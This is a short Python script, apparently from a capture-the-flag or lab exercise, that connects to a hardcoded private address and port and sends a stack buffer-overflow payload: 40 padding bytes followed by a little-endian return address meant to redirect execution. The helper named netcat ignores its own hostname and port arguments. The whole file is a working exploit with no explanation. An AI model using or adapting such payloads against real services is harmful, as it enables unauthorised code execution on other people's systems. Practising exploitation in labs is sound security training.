import socket
import sys

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.9.8.1', 5009))
    data = s.recv(1024)
    print ("initial: ", repr(data))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    data2 = s.recv(1024)
    print("Received:", repr(data2))
    print("Connection closed.")
    

content1 = b'A' * 40 + b'\x92\x11\x40\x00\x00\x00\x00\x00'
content = b'Olav'
hostname = '10.9.8.1'
port = 5009


netcat(hostname, port, content1)
